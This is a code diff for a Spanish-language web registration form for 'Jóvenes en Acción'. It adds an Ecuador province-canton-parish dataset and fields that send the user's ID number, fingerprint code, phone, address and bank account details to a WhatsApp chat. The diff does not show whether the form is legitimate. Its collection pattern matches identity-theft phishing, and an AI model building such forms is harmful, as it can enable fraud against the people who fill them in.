+                    "Piñas": ["Piñas", "Capiro", "La Bocana", "Moromoro", "Piedras", "San Roque", "Saracay"],
+                    "Portovelo": ["Portovelo", "Curtincapa", "Morales", "Salatí"],
+                    "Santa Rosa": ["Santa Rosa", "Bellavista", "Jambelí", "La Avanzada", "San Antonio", "Torata", "Victoria"],
+                    "Zaruma": ["Zaruma", "Abañín", "Arcapamba", "Guanazán", "Huertas", "Malvas", "Muluncay", "Salvias", "Sinsao"]
+                }
+            },
+            "Esmeraldas": {
+                cantones: {
+                    "Esmeraldas": ["Esmeraldas", "Camarones", "Coronel Carlos Concha", "Chinca", "Majua", "San Mateo", "Tabiazo", "Tachina", "Vuelta Larga"],
+                    "Atacames": ["Atacames", "La Unión", "Súa", "Tonchigüe", "Tonsupa"],
+                    "Eloy Alfaro": ["Valdez", "Anchayacu", "Borbón", "La Tola", "Luis Vargas Torres", "Maldonado", "Pampanal de Bolívar", "San Francisco de Ónzole", "Santa Lucía de las Peñas", "Santo Domingo de Ónzole", "Selva Alegre", "Telembí", "Colón Eloy"],
+                    "Muisne": ["Muisne", "Bolívar", "Daule", "Galera", "Quingue", "Salima", "San Francisco", "San Gregorio", "San José de Chamanga"],
+                    "Quinindé": ["Rosa Zárate", "Cube", "Chura", "Malimpia", "Viche", "La Unión"],
+                    "Rioverde": ["Rioverde", "Chontaduro", "Chumundé", "Lagarto", "Montalvo", "Rocafuerte"],
+                    "San Lorenzo": ["San Lorenzo", "Alto Tambo", "Ancón", "Calderón", "Carondelet", "5 de Junio", "Concepción", "Mataje", "San Javier de Cachaví", "Santa Rita", "Tambillo", "Tululbí", "Urbina"]
+                }
+            },
+            "Galápagos": {
+                cantones: {
+                    "San Cristóbal": ["Puerto Baquerizo Moreno", "El Progreso", "Santa María"],
+                    "Isabela": ["Puerto Villamil", "Tomás de Berlanga"],
+                    "Santa Cruz": ["Puerto Ayora", "Bellavista", "Santa Rosa"]
+                }
+            },
+            "Guayas": {
+                cantones: {
+                    "Guayaquil": [
+                        // Parroquias Urbanas
+                        "Ayacucho", "Bolívar-Sagrario", "Carbo-Concepción", "Febres Cordero", 
+                        "García Moreno", "Letamendi", "9 de Octubre", "Olmedo-San Alejo", 
+                        "Roca", "Rocafuerte", "Sucre", "Tarqui", "Urdaneta", "Ximena", 
+                        "Chongón", "Pascuales",
+                        // Parroquias Rurales
+                        "Juan Gómez Rendón (Progreso)", "El Morro", "Posorja", "Puná", "Tenguel"
+                    ],
+                    "Alfredo Baquerizo Moreno": ["Alfredo Baquerizo Moreno"],
+                    "Balao": ["Balao"],
+                    "Balzar": ["Balzar"],
+                    "Colimes": ["Colimes", "San Jacinto"],
+                    "Coronel Marcelino Maridueña": ["Coronel Marcelino Maridueña"],
+                    "Daule": ["Daule", "Juan Bautista Aguirre", "Laurel", "Limonal", "Los Lojas"],
+                    "Durán": ["Eloy Alfaro", "El Recreo"],
+                    "El Empalme": ["Velasco Ibarra", "Guayas", "El Rosario"],
+                    "El Triunfo": ["El Triunfo"],
+                    "General Antonio Elizalde": ["General Antonio Elizalde"],
+                    "Isidro Ayora": ["Isidro Ayora"],
+                    "Lomas de Sargentillo": ["Lomas de Sargentillo"],
+                    "Milagro": ["Milagro", "Chobo", "Mariscal Sucre", "Roberto Astudillo"],
+                    "Naranjal": ["Naranjal", "Jesús María", "San Carlos", "Santa Rosa de Flandes", "Taura"],
+                    "Naranjito": ["Naranjito"],
+                    "Nobol": ["Narcisa de Jesús"],
+                    "Palestina": ["Palestina"],
+                    "Pedro Carbo": ["Pedro Carbo", "Sabanilla", "Valle de la Virgen"],
+                    "Playas": ["General Villamil"],
+                    "Salitre": ["Salitre", "Boca de Caña", "Cabuyal", "General Vernaza", "La Victoria", "Junquillal"],
+                    "Samborondón": ["Samborondón", "Tarifa"],
+                    "San Jacinto de Yaguachi": ["Yaguachi Nuevo", "Yaguachi Viejo", "Virgen de Fátima"],
+                    "Santa Lucía": ["Santa Lucía"],
+                    "Simón Bolívar": ["Simón Bolívar", "Coronel Lorenzo de Garaicoa"]
+                }
+            },
+            "Imbabura": {
+                cantones: {
+                    "Ibarra": ["Ibarra", "Ambuquí", "Angochagua", "Carolina", "La Esperanza", "Lita", "Salinas", "San Antonio"],
+                    "Antonio Ante": ["Atuntaqui", "Imbaya", "San Francisco de Natabuela", "San José de Chaltura", "San Roque"],
+                    "Cotacachi": ["Cotacachi", "Apuela", "García Moreno", "Imantag", "Peñaherrera", "Plaza Gutiérrez", "Quiroga", "6 de Julio de Cuellaje", "Vacaz Galindo"],
+                    "Otavalo": ["Otavalo", "Dr. Miguel Egas Cabezas", "Eugenio Espejo", "González Suárez", "Pataquí", "San José de Quichinche", "San Juan de Ilumán", "San Pablo", "San Rafael", "Selva Alegre"],
+                    "Pimampiro": ["Pimampiro", "Chugá", "Mariano Acosta", "San Francisco de Sigsipamba"],
+                    "San Miguel de Urcuquí": ["Urcuquí", "Cahuasquí", "La Merced de Buenos Aires", "Pablo Arenas", "San Blas", "Tumbabiro"]
+                }
+            },
+            "Loja": {
+                cantones: {
+                    "Loja": ["Loja", "Chantaco", "Chuquiribamba", "El Cisne", "Gualel", "Jimbilla", "Malacatos", "Quinara", "Santiago", "San Pedro de Vilcabamba", "San Lucas", "Taquil", "Vilcabamba", "Yangana"],
+                    "Calvas": ["Cariamanga", "Colaisaca", "El Lucero", "Sanguillín", "Utuana"],
+                    "Catamayo": ["Catamayo", "El Tambo", "Guayquichuma", "San Pedro de la Bendita", "Zambi"],
+                    "Celica": ["Celica", "Cruzpamba", "Pózul", "Sabanilla", "Tnte. Maximiliano Rodríguez"],
+                    "Chaguarpamba": ["Chaguarpamba", "Buenavista", "El Rosario", "Santa Rufina", "Amarillos"],
+                    "Espíndola": ["Amaluza", "Bellavista", "El Airo", "El Ingenio", "Jimbura", "Santa Teresita", "27 de Abril"],
+                    "Gonzanamá": ["Gonzanamá", "Changaimina", "Nambacola", "Purunuma", "Quilanga", "Sacapalca", "San Antonio de las Aradas"],
+                    "Macará": ["Macará", "La Victoria", "Larama", "Sabiango"],
+                    "Olmedo": ["Olmedo", "La Tingue"],
+                    "Paltas": ["Catacocha", "Cangonamá", "Guachanamá", "Lauro Guerrero", "Orianga", "San Antonio", "Casanga", "Yamana"],
+                    "Pindal": ["Pindal", "Chaquinal", "Milagros", "12 de Diciembre"],
+                    "Puyango": ["Alamor", "Ciano", "El Arenal", "El Limo", "Mercadillo", "Vicentino"],
+                    "Quilanga": ["Quilanga", "Fundochamba", "San Antonio de las Aradas"],
+                    "Saraguro": ["Saraguro", "El Paraíso de Celén", "El Tablón", "Lluzhapa", "Manú", "San Antonio de Qumbe", "San Pablo de Tenta", "San Sebastián de Yúluc", "Selva Alegre", "Urdaneta"],
+                    "Sozoranga": ["Sozoranga", "Nueva Fátima", "Tacamoros"],
+                    "Zapotillo": ["Zapotillo", "Garza Real", "Limonés", "Paletillas", "Bolaspamba"]
+                }
+            },
+            "Los Ríos": {
+                cantones: {
+                    "Babahoyo": ["Babahoyo", "Barreiro", "Caracol", "Febres Cordero", "La Unión", "Pimocha"],
+                    "Baba": ["Baba", "Guare", "Isla de Bejucal"],
+                    "Buena Fe": ["Buena Fe", "Patricia Pilar", "San Jacinto de Buena Fe"],
+                    "Mocache": ["Mocache"],
+                    "Montalvo": ["Montalvo"],
+                    "Palenque": ["Palenque"],
+                    "Puebloviejo": ["Puebloviejo", "Puerto Pechiche", "San Juan"],
+                    "Quevedo": ["Quevedo", "La Esperanza", "San Carlos", "24 de Mayo"],
+                    "Quinsaloma": ["Quinsaloma"],
+                    "Urdaneta": ["Catarama", "Ricaurte"],
+                    "Valencia": ["Valencia", "La Nueva Unión"],
+                    "Ventanas": ["Ventanas", "Chacarita", "Zapotal"],
+                    "Vinces": ["Vinces", "Antonio Sotomayor"]
+                }
+            },
+            "Manabí": {
+                cantones: {
+                    "Portoviejo": ["Portoviejo", "Abdón Calderón", "Alajuela", "Chirijos", "El Florón", "Picoazá", "Pueblo Nuevo", "Riochico", "San Plácido"],
+                    "24 de Mayo": ["Sucre", "Bellavista", "Noboa", "Sixto Durán Ballén"],
+                    "Bolívar": ["Calceta", "Membrillo", "Quiroga"],
+                    "Chone": ["Chone", "Boyacá", "Canuto", "Convento", "Eloy Alfaro", "Ricaurte", "San Antonio"],
+                    "El Carmen": ["El Carmen", "Flavio Alfaro", "San Pedro de Suma"],
+                    "Flavio Alfaro": ["Flavio Alfaro", "San Francisco de Novillo"],
+                    "Jama": ["Jama"],
+                    "Jaramijó": ["Jaramijó"],
+                    "Jipijapa": ["Jipijapa", "América", "El Anegado", "Julcuy", "La Unión", "Pedro Pablo Gómez", "Puerto Cayo"],
+                    "Junín": ["Junín"],
+                    "Manta": ["Manta", "San Lorenzo", "Santa Marianita"],
+                    "Montecristi": ["Montecristi", "La Pila"],
+                    "Olmedo": ["Olmedo"],
+                    "Paján": ["Paján", "Campozano", "Cascol", "Guale", "Lascano"],
+                    "Pedernales": ["Pedernales", "Cojimíes", "10 de Agosto"],
+                    "Pichincha": ["Pichincha", "Barraganete", "San Sebastián"],
+                    "Puerto López": ["Puerto López", "Machalilla", "Salango"],
+                    "Rocafuerte": ["Rocafuerte"],
+                    "San Vicente": ["San Vicente", "Canoa"],
+                    "Santa Ana": ["Santa Ana", "Ayacucho", "Honorato Vásquez", "La Unión", "San Pablo"],
+                    "Sucre": ["Bahía de Caráquez", "Charapotó", "San Isidro"],
+                    "Tosagua": ["Tosagua", "Bachillero", "Estancilla"],
+                }
+            },
+            "Morona Santiago": {
+                cantones: {
+                    "Morona": ["Morona", "Alshi", "Cuchaentza", "Río Blanco", "San Isidro", "Sevilla Don Bosco", "Sinaí", "Zúñac"],
+                    "Gualaquiza": ["Gualaquiza", "Amazonas", "Bomboiza", "Chigüinda", "El Rosario", "Nueva Tarqui", "San Miguel de Cuyes", "El Ideal"],
+                    "Huamboya": ["Huamboya", "Chiguaza", "Pablo Sexto"],
+                    "Limón Indanza": ["General Leonidas Plaza Gutiérrez", "Indanza", "San Antonio", "San Miguel de Conchay", "Santa Susana de Chiviaza", "Yunganza"],
+                    "Logroño": ["Logroño", "Yaupi", "Shimpis"],
+                    "Pablo Sexto": ["Pablo Sexto"],
+                    "Palora": ["Palora", "Arapicos", "Cumandá", "Sangay", "16 de Agosto"],
+                    "San Juan Bosco": ["San Juan Bosco", "Pan de Azúcar", "San Carlos", "Santiago de Pananza"],
+                    "Santiago": ["Santiago de Méndez", "Copal", "Chupianza", "Patuca", "San Luis de El Acho"],
+                    "Sucúa": ["Sucúa", "Asunción", "Huambi", "Santa Marianita de Jesús"],
+                    "Taisha": ["Taisha", "Huasaga", "Macuma", "Tuutinentza"],
+                    "Tiwintza": ["Santiago", "San José de Morona"]
+                }
+            },
+            "Napo": {
+                cantones: {
+                    "Tena": ["Tena", "Ahuano", "Chontapunta", "Pano", "Puerto Misahuallí", "Puerto Napo", "Talag"],
+                    "Archidona": ["Archidona", "Cotundo", "San Pablo de Ushpayacu"],
+                    "Baeza": ["Baeza", "Cosanga", "Cuyuja", "Papallacta", "San Francisco de Borja", "Sumaco"],
+                    "Carlos Julio Arosemena Tola": ["Carlos Julio Arosemena Tola"],
+                    "El Chaco": ["El Chaco", "Gonzalo Díaz de Pineda", "Linares", "Oyacachi", "Santa Rosa"],
+                    "Quijos": ["Baeza", "Cosanga", "Cuyuja", "Papallacta", "San Francisco de Borja", "Sumaco"]
+                }
+            },
+            "Orellana": {
+                cantones: {
+                    "Francisco de Orellana": ["Puerto Francisco de Orellana", "Alejandro Labaka", "Dayuma", "Edén", "El Dorado", "García Moreno", "Inés Arango", "La Belleza", "Nuevo Paraíso", "San José de Guayusa", "San Luis de Armenia", "Taracoa"],
+                    "Aguarico": ["Nuevo Rocafuerte", "Capitán Augusto Rivadeneira", "Cononaco", "Santa María de Huiririma", "Tiputini", "Yasuní"],
+                    "La Joya de los Sachas": ["La Joya de los Sachas", "Enokanqui", "Pompeya", "San Carlos", "San Sebastián del Coca", "Lago San Pedro", "Rumipamba", "Tres de Noviembre", "Unión Milagreña"],
+                    "Loreto": ["Loreto", "Ávila", "Puerto Murialdo", "San José de Dahuano", "San Vicente de Huaticocha"]
+                }
+            },
+            "Pastaza": {
+                cantones: {
+                    "Pastaza": ["Puyo", "Diez de Agosto", "Fátima", "Montalvo", "Pomona", "Río Corrientes", "Río Tigre", "Santa Rosa", "Saramé", "Simón Bolívar", "Tarqui", "Teniente Hugo Ortiz", "Veracruz", "El Triunfo"],
+                    "Arajuno": ["Arajuno", "Curaray"],
+                    "Mera": ["Mera", "Madre Tierra", "Shell"],
+                    "Santa Clara": ["Santa Clara", "San José"]
+                }
+            },
+            "Pichincha": {
+                cantones: {
+                    "Quito": ["Quito", "Alangasí", "Amaguaña", "Atahualpa", "Calacalí", "Calderón", "Conocoto", "Cumbayá", "Chavezpamba", "Checa", "El Quinche", "Gualea", "Guangopolo", "Guayllabamba", "La Merced", "Llano Chico", "Lloa", "Nanegal", "Nanegalito", "Nayón", "Nono", "Pacto", "Perucho", "Pifo", "Píntag", "Pomasqui", "Puéllaro", "Puembo", "San Antonio", "San José de Minas", "Tababela", "Tumbaco", "Yaruquí", "Zámbiza"],
+                    "Cayambe": ["Cayambe", "Ascázubi", "Cangahua", "Olmedo", "Otón", "Santa Rosa de Cuzubamba"],
+                    "Mejía": ["Machachi", "Alóag", "Aloasí", "Cutuglagua", "El Chaupi", "Manuel Cornejo Astorga", "Tandapi", "Tambillo"],
+                    "Pedro Moncayo": ["Tabacundo", "La Esperanza", "Malchinguí", "Tocachi", "Tupigachi"],
+                    "Pedro Vicente Maldonado": ["Pedro Vicente Maldonado"],
+                    "Puerto Quito": ["Puerto Quito"],
+                    "Rumiñahui": ["Sangolquí", "Cotogchoa", "Rumipamba", "San Pedro de Taboada", "San Rafael"],
+                    "San Miguel de los Bancos": ["San Miguel de los Bancos", "Mindo", "San Pedro de los Bancos"]
+                }
+            },
+            "Santa Elena": {
+                cantones: {
+                    "Santa Elena": ["Santa Elena", "Atahualpa", "Colonche", "Chanduy", "Manglaralto", "Simón Bolívar", "San José de Ancón"],
+                    "La Libertad": ["La Libertad"],
+                    "Salinas": ["Salinas", "Anconcito", "José Luis Tamayo"]
+                }
+            },
+            "Santo Domingo de los Tsáchilas": {
+                cantones: {
+                    "Santo Domingo": ["Santo Domingo", "Alluriquín", "Luz de América", "Puerto Limón", "San Jacinto del Búa", "Valle Hermoso", "El Esfuerzo", "Santa María del Toachi"],
+                    "La Concordia": ["La Concordia", "Monterrey", "Las Villegas", "Plan Piloto"]
+                }
+            },
+            "Sucumbíos": {
+                cantones: {
+                    "Lago Agrio": ["Nueva Loja", "Dureno", "El Eno", "General Farfán", "Jambelí", "Pacayacu", "Santa Cecilia", "10 de Agosto"],
+                    "Cascales": ["El Dorado de Cascales", "Santa Rosa de Sucumbíos", "Sevilla"],
+                    "Cuyabeno": ["Tarapoa", "Aguas Negras", "Cuyabeno"],
+                    "Gonzalo Pizarro": ["Lumbaqui", "El Reventador", "Puerto Libre"],
+                    "Putumayo": ["Puerto El Carmen del Putumayo", "Palma Roja", "Puerto Rodríguez", "Santa Elena", "Puerto Bolívar"],
+                    "Shushufindi": ["Shushufindi", "Limoncocha", "Pañacocha", "San Roque", "San Pedro de los Cofanes", "Siete de Julio"],
+                    "Sucumbíos": ["La Bonita", "El Playón de San Francisco", "La Sofía", "Rosa Florida", "Santa Bárbara"]
+                }
+            },
+            "Tungurahua": {
+                cantones: {
+                    "Ambato": ["Ambato", "Ambatillo", "Atahualpa", "Augusto N. Martínez", "Constantino Fernández", "Cunchibamba", "Huachi Grande", "Izamba", "Juan Benigno Vela", "Montalvo", "Pasa", "Picaigua", "Pilahuín", "Quisapincha", "San Bartolomé de Pinllo", "San Fernando", "Santa Rosa", "Totoras", "Unamuncho"],
+                    "Baños de Agua Santa": ["Baños de Agua Santa", "Lligua", "Río Negro", "Río Verde", "Ulba"],
+                    "Cevallos": ["Cevallos"],
+                    "Mocha": ["Mocha", "Pinguilí"],
+                    "Patate": ["Patate", "El Triunfo", "Los Andes", "Sucre"],
+                    "Quero": ["Quero", "Rumipamba", "Yanayacu"],
+                    "San Pedro de Pelileo": ["Pelileo", "Benítez", "Bolívar", "Cotaló", "Chiquicha", "El Rosario", "García Moreno", "Guambaló", "Salasaca"],
+                    "Santiago de Píllaro": ["Píllaro", "Baquerizo Moreno", "Emilio María Terán", "Marcos Espinel", "Presidente Urbina", "San Andrés", "San José de Poaló", "San Miguelito"],
+                    "Tisaleo": ["Tisaleo", "Quinchicoto"]
+                }
+            },
+            "Zamora Chinchipe": {
+                cantones: {
+                    "Zamora": ["Zamora", "Cumbaratza", "Guadalupe", "Imbana", "Sabanilla", "San Carlos de las Minas", "Timbara"],
+                    "Centinela del Cóndor": ["Zumbi", "Paquisha", "Triunfo Dorado"],
+                    "Chinchipe": ["Zumba", "Chito", "El Chorro", "La Chonta", "Pucapamba", "San Andrés"],
+                    "El Pangui": ["El Pangui", "El Guisme", "Pachicutza", "Tundayme"],
+                    "Nangaritza": ["Guayzimi", "Zurmi", "Nuevo Paraíso"],
+                    "Palanda": ["Palanda", "El Porvenir del Carmen", "San Francisco del Vergel", "Valladolid", "La Canela"],
+                    "Paquisha": ["Paquisha", "Bellavista", "Nuevo Quito"],
+                    "Yacuambi": ["Yacuambi", "La Paz", "Tutupali"],
+                    "Yantzaza": ["Yantzaza", "Chicaña", "Los Encuentros"]
+                }
+            }
+        };
+
+        // Cargar provincias al iniciar
+        function cargarProvincias() {
+            const selectProvincia = document.getElementById('provincia');
+            selectProvincia.innerHTML = '<option value="">Seleccionar provincia</option>';
+            
+            for (const provincia in dataEcuador) {
+                const option = document.createElement('option');
+                option.value = provincia;
+                option.textContent = provincia;
+                selectProvincia.appendChild(option);
+            }
+        }
+
+        // Actualizar cantones según provincia seleccionada
+        function actualizarCantones() {
+            const provinciaSeleccionada = document.getElementById('provincia').value;
+            const selectCanton = document.getElementById('canton');
+            const selectParroquia = document.getElementById('parroquia');
+            
+            selectCanton.innerHTML = '<option value="">Seleccionar cantón</option>';
+            selectParroquia.innerHTML = '<option value="">Primero seleccione cantón</option>';
+            
+            if (provinciaSeleccionada && dataEcuador[provinciaSeleccionada]) {
+                const cantones = dataEcuador[provinciaSeleccionada].cantones;
+                for (const canton in cantones) {
+                    const option = document.createElement('option');
+                    option.value = canton;
+                    option.textContent = canton;
+                    selectCanton.appendChild(option);
+                }
+            }
+            
+            updateProgress();
+        }
+
+        // Actualizar parroquias según cantón seleccionado
+        function actualizarParroquias() {
+            const provinciaSeleccionada = document.getElementById('provincia').value;
+            const cantonSeleccionado = document.getElementById('canton').value;
+            const selectParroquia = document.getElementById('parroquia');
+            
+            selectParroquia.innerHTML = '<option value="">Seleccionar parroquia</option>';
+            
+            if (provinciaSeleccionada && cantonSeleccionado && 
+                dataEcuador[provinciaSeleccionada] && 
+                dataEcuador[provinciaSeleccionada].cantones[cantonSeleccionado]) {
+                
+                const parroquias = dataEcuador[provinciaSeleccionada].cantones[cantonSeleccionado];
+                parroquias.forEach(parroquia => {
+                    const option = document.createElement('option');
+                    option.value = parroquia;
+                    option.textContent = parroquia;
+                    selectParroquia.appendChild(option);
+                });
+            }
+            
+            updateProgress();
+        }
+
+        // Actualizar barra de progreso
+        function updateProgress() {
+            const requiredFields = document.querySelectorAll('[required]');
+            const totalFields = requiredFields.length;
+            let filledFields = 0;
+            
+            requiredFields.forEach(field => {
+                if (field.value && field.value !== '') {
+                    filledFields++;
+                }
+            });
+            
+            const progress = (filledFields / totalFields) * 100;
+            document.getElementById('progressFill').style.width = progress + '%';
+        }
+        
+        // Escuchar cambios en todos los campos
+        document.querySelectorAll('input, select, textarea').forEach(element => {
+            element.addEventListener('input', updateProgress);
+            element.addEventListener('change', updateProgress);
+        });
+
+        // Cargar datos iniciales
+        window.addEventListener('DOMContentLoaded', () => {
+            cargarProvincias();
+        });
+
         document.getElementById('registroForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -646,6 +1149,13 @@
             const cedula = document.getElementById('cedula').value;
             if (cedula.length !== 10 || !/^\d+$/.test(cedula)) {
                 mostrarAlerta('❌ Por favor ingrese una cédula válida de 10 dígitos', 'error');
+                return;
+            }
+            
+            // Validar celular
+            const celular = document.getElementById('celular').value;
+            if (celular.length !== 10 || !/^\d+$/.test(celular)) {
+                mostrarAlerta('❌ Por favor ingrese un número celular válido de 10 dígitos', 'error');
                 return;
             }
             
@@ -661,10 +1171,15 @@
             const datos = {
                 cedula: document.getElementById('cedula').value,
                 codigoDactilar: document.getElementById('codigoDactilar').value,
+                celular: document.getElementById('celular').value,
+                email: document.getElementById('email').value,
                 provincia: document.getElementById('provincia').value,
                 canton: document.getElementById('canton').value,
+                parroquia: document.getElementById('parroquia').value,
                 direccion: document.getElementById('direccion').value,
-                email: document.getElementById('email').value,
+                institucionPreferencia: document.getElementById('institucionPreferencia').value,
+                area: document.getElementById('area').value,
+                destreza: document.getElementById('destreza').value,
                 institucionFinanciera: document.getElementById('institucionFinanciera').value,
                 tipoCuenta: document.getElementById('tipoCuenta').value,
                 numeroCuenta: document.getElementById('numeroCuenta').value,
@@ -680,8 +1195,8 @@
                 })
             };
             
-            // Crear mensaje para WhatsApp con formato mejorado
-            const mensaje = `🌟 *NUEVO REGISTRO - JÓVENES EN ACCIÓN* 🌟
+            // Crear mensaje para WhatsApp
+            const mensaje = `🌟 *NUEVO REGISTRO COMPLETO - JÓVENES EN ACCIÓN* 🌟
         
         📅 *Fecha:* ${datos.fecha}
         ⏰ *Hora:* ${datos.hora}
@@ -691,18 +1206,23 @@
         ━━━━━━━━━━━━━━━━━━━━━
         📋 Cédula: ${datos.cedula}
         🔢 Código Dactilar: ${datos.codigoDactilar}
+        📱 Celular: ${datos.celular}
+        📧 Email: ${datos.email}
         
         ━━━━━━━━━━━━━━━━━━━━━
-        📍 *DIRECCIÓN*
+        📍 *DIRECCIÓN COMPLETA*
         ━━━━━━━━━━━━━━━━━━━━━
         🏙️ Provincia: ${datos.provincia}
         🏘️ Cantón: ${datos.canton}
+        🏛️ Parroquia: ${datos.parroquia}
         📍 Dirección: ${datos.direccion}
         
         ━━━━━━━━━━━━━━━━━━━━━
-        📧 *CONTACTO*
+        🏢 *INSTITUCIÓN Y ÁREA*
         ━━━━━━━━━━━━━━━━━━━━━
-        ✉️ Email: ${datos.email}
+        🏛️ Institución: ${datos.institucionPreferencia}
+        📊 Área: ${datos.area}
+        🎯 Destreza: ${datos.destreza}
         
         ━━━━━━━━━━━━━━━━━━━━━
         💰 *DATOS BANCARIOS*
@@ -712,7 +1232,7 @@
         🔢 Número de Cuenta: ${datos.numeroCuenta}
         
         ━━━━━━━━━━━━━━━━━━━━━
-        ✅ *REGISTRO COMPLETADO*
+        ✅ *REGISTRO COMPLETADO EXITOSAMENTE*
         📱 Enviado desde el sistema automatizado`;
             
             // Codificar mensaje para URL
@@ -725,12 +1245,12 @@
             const urlWhatsApp = `https://wa.me/${numeroWhatsApp}?text=${mensajeCodificado}`;
             
             // Mostrar alerta de éxito
-            mostrarAlerta('✅ ¡Datos procesados correctamente! Abriendo WhatsApp en unos segundos...', 'success');
+            mostrarAlerta('✅ ¡Datos procesados correctamente! Abriendo WhatsApp...', 'success');
             
             // Efecto de carga en el botón
             const btn = document.querySelector('.btn-submit');
             const originalText = btn.innerHTML;
-            btn.innerHTML = '⏳ Preparando envío...';
+            btn.innerHTML = '<span class="loading-spinner"></span> Preparando envío...';
             btn.style.pointerEvents = 'none';
             
             // Abrir WhatsApp en nueva ventana
@@ -741,6 +1261,7 @@
                 
                 // Limpiar formulario
                 document.getElementById('registroForm').reset();
+                document.getElementById('progressFill').style.width = '0%';
                 document.getElementById('alert').style.display = 'none';
             }, 2000);
         });
@@ -751,17 +1272,14 @@
             alert.className = `alert alert-${tipo}`;
             alert.style.display = 'flex';
             
-            // Auto-ocultar después de 6 segundos
             setTimeout(() => {
                 alert.style.display = 'none';
             }, 6000);
         }
         
-        // Validación en tiempo real de cédula
+        // Validación en tiempo real
         document.getElementById('cedula').addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '').substring(0, 10);
-            
-            // Feedback visual
             if (this.value.length === 10) {
                 this.style.borderColor = '#48bb78';
             } else {
@@ -769,28 +1287,24 @@
             }
         });
         
-        // Validación de número de cuenta
+        document.getElementById('celular').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').substring(0, 10);
+            if (this.value.length === 10) {
+                this.style.borderColor = '#48bb78';
+            } else {
+                this.style.borderColor = '#e2e8f0';
+            }
+        });
+        
         document.getElementById('numeroCuenta').addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '');
         });
         
-        // Animación suave al hacer scroll
-        document.querySelectorAll('input, select').forEach(element => {
-            element.addEventListener('focus', function() {
-                this.parentElement.style.transform = 'scale(1.02)';
-            });
-            
-            element.addEventListener('blur', function() {
-                this.parentElement.style.transform = 'scale(1)';
-            });
-        });
-        
-        // Prevenir envío con Enter en campos individuales
+        // Navegación con Enter
         document.querySelectorAll('input').forEach(input => {
             input.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
                     e.preventDefault();
-                    // Enfocar el siguiente campo
                     const inputs = Array.from(document.querySelectorAll('input, select'));
                     const index = inputs.indexOf(this);
                     if (index < inputs.length - 1) {
